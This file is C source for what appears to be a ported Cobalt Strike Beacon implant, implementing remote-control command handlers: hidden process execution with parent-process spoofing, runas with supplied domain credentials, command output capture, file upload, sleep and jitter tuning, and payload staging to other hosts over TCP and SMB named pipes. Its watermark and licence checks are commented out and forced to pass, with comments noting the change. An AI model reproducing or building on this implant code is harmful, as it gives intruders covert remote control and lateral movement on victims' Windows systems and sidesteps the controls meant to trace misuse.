#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "crypto.h" /* rng_get_bytes 收敛到 crypto 层 */
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "process.h"
#include "jobs.h"
#include "functions.h"
#include <WinSock2.h>
#include "channel.h"

/* 我们应该休眠多长时间... */
extern unsigned int sleep_time;
extern unsigned int jitter;
extern unsigned int post_type;

extern HANDLE atoken;

/* 终止信标 */
void command_die(void(*cb)(char * buffer, int length, int type)) {
	//dlog("Received die command (really)!!!\n");
	sleep_time = 0;
	cb(NULL, 0, CALLBACK_DEAD);
}

/* 更改当前目录 */
void command_cd(char * buffer, int length) {
	char path[1024];

	if (length > 1023)
		return;

	strncpy(path, buffer, length); 
	*(path + length) = '\0';

	SetCurrentDirectoryA(path);
	//dlog("Set directory to '%s'\n", path);
}

/* 设置环境变量 :) */
void command_setenv(char * buffer, int length) {
	putenv(buffer);
}

unsigned int bigger_rand() {
	unsigned int number;
	crypto_rng_get_bytes((unsigned char *)&number, sizeof(unsigned int));
	return number;
}

/* 调整休眠时间 */
void command_sleep(char * buffer, int length) {
	datap parser;

	/* CS-13: 休眠更新不应覆盖零休眠时间（等待退出） */
	if (sleep_time == 0) {
		//dlog("Sleep has already been set to magic number (%d).  Ignoring sleep command.\n", sleep_time);
		return;
	}

	/* 设置数据解析器 */
	data_init(&parser, buffer, length);

	/* 设置休眠时间 */
	sleep_time = data_int(&parser);

	/* 设置抖动值 */
	jitter = data_int(&parser);

	/* 这是对抖动值的健全性检查 */
	if (jitter <= 0 || jitter > 99)
		jitter = 0;
}

/* 调用命令...不使用shell */
void command_execute(char * buffer, int length) {
	char    cbuffer[1024];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	/* 重置一些内容 */
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	/* 进一步处理启动信息数据结构 */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = NULL;
	si.hStdError = NULL;
	si.hStdInput = NULL;

	/* 检查命令长度 */
	if (length > 1023)
		return;

	/* 创建命令行字符串 */
	strncpy(cbuffer, buffer, length);
	cbuffer[length] = '\0';

	/* 启动进程！ */
	execute_program_with_default_ppid(cbuffer, length, &si, &pi, 0, FALSE);

	/* 清理进程 */
	cleanupProcess(&pi);
}

void command_runu(char * buffer, int length) {
	DWORD  ppid;
	char * command;
	datap parser;
	datap * local;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE oldt;
	HANDLE hParentProcess = NULL;

	/* 重置一些内容 */
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	/* 进一步处理启动信息数据结构 */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = NULL;
	si.hStdError = NULL;
	si.hStdInput = NULL;

	/* 分配本地内存 */
	local = data_alloc(8192);
	command = data_ptr(local, 8192);

	/* 初始化解析器 */
	data_init(&parser, buffer, length);

	/* 获取PPID */
	ppid = data_int(&parser);
	data_string(&parser, command, 8192);

	execute_program_with_ppid(command, strlen(command), &si, &pi, CREATE_NEW_CONSOLE, FALSE, ppid);

	/* 释放数据 */
	data_free(local);

	/* 清理进程 */
	cleanupProcess(&pi);
}

/* 快速/轻松地将ASCII字符串转换为宽字符 */
BOOL toWideChar(char * src, wchar_t * dst, int max) {
	size_t size;

	size = MultiByteToWideChar(CP_ACP, 0, src, -1, NULL, 0);
	if (size == (size_t)-1 || size >= max)
		return FALSE;

	MultiByteToWideChar(CP_ACP, 0, src, -1, dst, max);
	return TRUE;
}

/* 域名、用户、密码、命令+参数 [所有字符串都是宽字符串，供参考] */
void command_runas(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	PROCESS_INFORMATION proc;
	char * domain;
	char * user;
	char * pass;
	char * command;
	datap * local;
	datap parser;

	/* 设置内存 */
	local = data_alloc((1024 * 3) + MAX_RUNAS_CMD);
	command = data_ptr(local, MAX_RUNAS_CMD);
	domain  = data_ptr(local, 1024);
	user    = data_ptr(local, 1024);
	pass    = data_ptr(local, 1024);

	/* 设置数据解析器 */
	data_init(&parser, buffer, length);

	/* 提取参数 */
	if (!data_string(&parser, domain, 1024)) {
		data_free(local);
		return;
	}

	if (!data_string(&parser, user, 1024)) {
		data_free(local);
		return;
	}

	if (!data_string(&parser, pass, 1024)) {
		data_free(local);
		return;
	}

	if (!data_string(&parser, command, MAX_RUNAS_CMD)) {
		data_free(local);
		return;
	}

	/* 禁用当前令牌 */
	token_guard_start();

	/* 执行run_as */
	runas(domain, user, pass, command, 0, &proc);

	/* 重新启用当前令牌 */
	token_guard_stop();

	/* 释放内存 */
	data_free(local);

	/* 清理进程 */
	cleanupProcess(&proc);
}

void execjob_doit(char * runme, DWORD runme_length, DWORD flags) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;
	HANDLE newstdout, read_stdout;
	DWORD total_read;

	/* 重置一些内容 */
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	/* 设置安全属性（管道需要） */
	sa.lpSecurityDescriptor = 0;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;

	/* 我们只设置stdout管道 */
	CreatePipe(&read_stdout, &newstdout, &sa, 1024 * 1024);

	/* 进一步处理启动信息数据结构 */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = newstdout;
	si.hStdError = newstdout;
	si.hStdInput = NULL;

	/* 执行它 */
	if (!execute_program_with_default_ppid(runme, runme_length, &si, &pi, CREATE_NEW_CONSOLE, FALSE)) {
		return;
	}

	/* 等待进程完成，最多10秒 */
	WaitForSingleObject(pi.hProcess, 10 * 1000);

	/* 跟踪此进程 */
	psh_track(pi, read_stdout, newstdout);
}

/* 调用本地OS命令，获取输出，稍后发送回去 */
void command_execjob(char * buffer, int length) {
	datap    parser;
	datap  * chunks;
	char   * command;
	char   * command_exp;
	char   * args;
	char   * runme;
	WORD     flags;
	PVOID OldValue;

	/* 分配内存供我们使用 */
	chunks      = data_alloc(8192 * 4);
	command     = data_ptr(chunks, 8192);
	command_exp = data_ptr(chunks, 8192);
	args        = data_ptr(chunks, 8192);
	runme       = data_ptr(chunks, 8192);

	/* 初始化解析器并获取参数 */
	data_init(&parser, buffer, length);
	data_string(&parser, command, 8192); /* If either of these fail, it's OK. commands + args */
	data_string(&parser, args, 8192);    /* are initialized to 0 by data_alloc. */
	flags = (WORD)data_short(&parser);

	/* 仅在命令中展开环境变量！ */
	env_expand(command, command_exp, 8192);

	/* 将命令和参数组合成一个字符串 */
	strncat_s(runme, 8192, command_exp, 8192);
	strncat_s(runme, 8192, args, 8192);

	/* 将此代码传递给执行器函数（先禁用WOW64！） */
	if ((flags & 1) == 1) {
		DisableWow64(&OldValue);
		execjob_doit(runme, strlen(runme) + 1, flags);
		RevertWow64(OldValue);
	}
	/* 将此代码传递给执行器函数 */
	else {
		execjob_doit(runme, strlen(runme) + 1, flags);
	}

	/* 释放已分配的块 */
	data_free(chunks);
}

/* 上传一些内容 */
void command_upload(char * buffer, int length, char * mode) {
	FILE * outfile;
	char * name;
	char * data;
	int    dlen;
	datap parser;

	/* 分配名称 */
	name = (char *)malloc(sizeof(char) * 1024);
	if (name == NULL)
		return;

	/* 设置数据解析器 */
	data_init(&parser, buffer, length);

	/* 提取参数 */
	if (!data_string(&parser, name, 1024)) {
		free(name);
		return;
	}

	/* 打开文件 */
	outfile = fopen(name, mode);
	if (outfile == INVALID_HANDLE_VALUE || outfile == NULL) {
		free(name);
		post_error_d(0x08, GetLastError());
		return;
	}

	/* 写入内容 */
	fwrite(data_buffer(&parser), 1, data_length(&parser), outfile);

	/* 请关闭文件 */
	fclose(outfile);

	/* name 在所有路径上均已释放（原"内存泄漏，糟糕！"注释指向上游旧版行为，
	   当前代码不存在泄漏，保留说明以免误导）。 */
	free(name);
}

/* 返回此信标的当前工作目录 */
void command_pwd(void (*callback)(char * buffer, int length, int type)) {
	char  result[2048] = {0};
	DWORD size = 0;

	size = GetCurrentDirectoryA(2048, result);
	if (size > 0) {
		callback(result, size, CALLBACK_PWD);
	}
}

void command_pause(char * buffer, int length) {
	datap parser;
	int   time;

	data_init(&parser, buffer, length);

	time = data_int(&parser);
	Sleep(time);
}

/* 建立到主机:端口的连接 */
SOCKET wsconnect(char * targetip, int port) {
	struct hostent * target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;

	/* 设置套接字 */
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		return INVALID_SOCKET;

	/* 解析目标 */
	target = gethostbyname(targetip);
	if (target == NULL)
		return INVALID_SOCKET;

	/* 将目标信息复制到套接字中 */
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	/* 尝试连接 */
	if (connect(my_socket, (struct sockaddr *)&sock, sizeof(sock))) {
		closesocket(my_socket);
		return INVALID_SOCKET;
	}

	return my_socket;
}

void command_stage_payload(char * buffer, int length) {
	datap  parser;
	DWORD  port;
	char * data;
	char * host;
	DWORD  len;
	SOCKET MySock = INVALID_SOCKET;
	DWORD  stopat = GetTickCount() + 60000;

	/* 解析参数 */
	data_init(&parser, buffer, length);

	host = data_string_asciiz(&parser);
	port = data_int(&parser);
	data = data_buffer(&parser);
	len = data_length(&parser);

	/* 初始化winsock */
	channel_winsock_init();

	/* 设置套接字 */
	while (GetTickCount() < stopat) {
		MySock = wsconnect(host, port);
		if (MySock == INVALID_SOCKET) {
			Sleep(1000);
		}
		else {
			/* 发送数据 */
			send(MySock, data, len, 0);
			goto cleanup;
		}
	}

	/* 如果我们到了这里，就是失败了 */
	post_error_na(0x46);

cleanup:
	/* 清理！ */
	Sleep(1000);
	closesocket(MySock);
}

void command_stage_payload_smb(char * buffer, int length) {
	datap  parser;
	char   pipe[128];
	char * data;
	DWORD  len;
	DWORD  x;
	HANDLE handle;
	DWORD  wrote = 0;
	DWORD  temp;
	DWORD  stopat = GetTickCount() + 60000;

	data_init(&parser, buffer, length);

	data_string(&parser, pipe, 128);
	data = data_buffer(&parser);
	len  = data_length(&parser);

	for (x = 0; x < 10; x++) {
		if (connect_pipe(pipe, &handle)) {
			WriteFile(handle, (char *)&len, 4, &temp, NULL);

			while (wrote < len) {
				if (WriteFile(handle, data + wrote, (len - wrote) > 8192 ? 8192 : (len - wrote), &temp, NULL)) {
					wrote += temp;
				}
				else {
					break;
				}
			}

			FlushFileBuffers(handle);
			DisconnectNamedPipe(handle);
			CloseHandle(handle);

			Sleep(1000);
			return;
		}
		/* this error is automatically bad news and we probably blocked for five minutes waiting for it */
		else if (GetLastError() == 53) {
			break;
		}
		/* if we have something else going on, let's not go past 60s. K? */
		else if (GetTickCount() >= stopat) {
			break;
		}
		else {
			Sleep(1000);
		}
	}

	post_error_sd(0x32, pipe, GetLastError());
}

/*
* The contract:
* TRUE  - exit
* FALSE - continue as normal
*/
BOOL check_kill_date() {
	SYSTEMTIME meow;
	DWORD      today;

	/* do nothing if there is no killdate! */
	if (setting_int(SETTING_KILLDATE) == 0) {
		return FALSE;
	}

	/* ok, get today's date */
	GetLocalTime(&meow);

	/* normalize it */
	today = meow.wYear * 10000;	/* 1601 - 30827 = 1601 0000 - 30827 0000 */
	today += meow.wMonth * 100;		/* 1-12         =       100 - 30827 1200 */
	today += meow.wDay;				/* 1-31         =         1 - 30827 1231 */

	/* compare the two */
	if (today >= setting_int(SETTING_KILLDATE)) {
		return TRUE;
	}
	else {
		return FALSE;
	}
}

/*
* The contract:
* TRUE  - exit
* FALSE - continue as normal
*/
BOOL bad_watermark() {

//	unsigned int wm = setting_int(SETTING_WATERMARK);
	// dlog("Beacon Watermark: %d\n", wm);

	/* Watermark == 0 is legacy trial license (depricated) and also hackers (boo)... */
//	if (wm == 0) {
		// dlog("Watermark = zero: %d\n", wm);
//		return TRUE;
//	}

	/* Watermark < 10000 is not valid.  4.5+ will require watermarks are 5+ digits... */
//	if (wm < 10000) {
		// dlog("Watermark < 10000: %d\n", wm);
//		return TRUE;
//	}

	/* 移植版中水印检查由 TeamServer 注入并在 TS 侧校验，这里恒报 "not bad"（= 继续）。
	   注意：本函数必须返回 FALSE——原版在检查全部注释掉后仍 return TRUE，配合
	   beacon.cpp 的 if (bad_watermark()) safe_exit() 会在启动时立即自杀。 */
	return FALSE;
}

/*
* The contract:
* TRUE  - exit
* FALSE - continue as normal
*/
BOOL bad_watermarkHash() {

// ===========================================================
// THIS IS REPLICATED IN .../external/sshagent/src/beacon.c
// ===========================================================

//	int watermarkKey;
//	long wmhLen;
//	BOOL bad = TRUE;

//	unsigned int wm = setting_int(SETTING_WATERMARK);
//	char * wmh = setting_ptr(SETTING_WATERMARK_HASH);

//	if (wmh == NULL) {
		// dlog("Checking Beacon Watermark Hash - HASH IS NULL\n");
//		wm = 0;
//		return TRUE;
//	}

	/* No watermark hash? */
//	wmhLen = strlen(wmh);
//	if (wmhLen < 1) {
		// dlog("Checking Beacon Watermark Hash - NO HASH PROVIDED\n");
//		wm = 0;
//		wmhLen = 0;
//		return TRUE;
//	}

	// dlog("Checking Beacon Watermark Hash - Watermark: %d Hash: %s Hash Length %li \n", wm, wmh, wmhLen);

//	watermarkKey = createWMKey(wm);
	// dlog("Calculated Watermark Key: %d", watermarkKey);

//	bad = decodeWatermark(wmh, wmhLen, watermarkKey, wm);
//	watermarkKey = 0;

	// dlog("Exiting bad_watermarkHash with status: %i", bad);

	/* 同 bad_watermark：恒报 "not bad"（= 继续），水印哈希校验由 TS 侧负责。 */
	return FALSE;
}
